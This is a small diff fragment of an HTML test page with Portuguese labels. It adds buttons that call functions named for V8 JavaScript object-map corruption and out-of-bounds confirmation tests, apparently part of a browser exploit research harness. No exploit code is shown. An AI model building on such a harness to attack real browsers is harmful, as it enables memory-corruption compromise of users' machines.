+            <button onclick="runJSObjectMapCorruption_v8()">Rodar T4 (JS Obj Map Corr v8)</button>
+            <button onclick="runOOBTestU8_Confirm()">Rodar T5 (OOB Confirm)</button>
             <button id="runAllBtn" onclick="runAll()">Rodar Todos (Auto)</button>
             <br>
             <span style="margin-left: 5px;">Teste JS Link (T1): </span>
